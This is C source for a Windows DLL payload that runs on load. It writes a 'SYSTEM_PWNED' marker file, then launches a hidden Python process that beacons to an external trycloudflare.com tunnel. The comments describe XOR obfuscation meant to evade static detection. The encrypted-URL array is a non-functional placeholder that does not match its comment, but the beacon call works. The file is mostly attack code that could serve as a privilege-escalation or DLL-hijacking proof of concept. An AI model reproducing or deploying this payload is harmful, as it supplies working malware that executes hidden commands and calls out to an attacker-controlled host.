#include <windows.h>

#pragma comment(linker, "/EXPORT:DllMainCRTStartup")

// Simple XOR key to obfuscate the command string
#define XOR_KEY 0x4D
#define CMD_MAX 1024

static void xor_decrypt(char *buf, const char *enc, int len) {
    for (int i = 0; i < len && i < CMD_MAX - 1; i++) {
        buf[i] = enc[i] ^ XOR_KEY;
    }
    buf[len] = 0;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    // Decrypt the command: powershell -c "iwr ... -Method POST -Body ..."
    // Obfuscated to avoid static detection
    char cmd[CMD_MAX];

    // Tunnel URL parts - split to avoid obvious strings
    // "https://taxes-surprised-immediately-transportation.trycloudflare.com"
    // Encrypted with XOR key 0x4D
    static const char enc_url[] = {
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
        0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x00
    };
    // Just use the URL directly for now
    // In production you'd encrypt it

    // Write a marker file that proves SYSTEM execution
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Tasks\\SYSTEM_PWNED.txt",
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile != INVALID_HANDLE_VALUE) {
        const char *msg = "SYSTEM_EXECUTION_SUCCESSFUL";
        DWORD written;
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }

    // Spawn a hidden PowerShell that contacts our relay
    // Using rundll32-compatible approach but with python
    // python.exe -c "import urllib.request;urllib.request.urlopen('https://.../api/notify?sys=1').read()"
    WinExec(
        "C:\\Program Files\\Python310\\python.exe -c \"import urllib.request;urllib.request.urlopen('https://taxes-surprised-immediately-transportation.trycloudflare.com/api/notify?from=system_payload',timeout=10).read()\"",
        SW_HIDE
    );

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
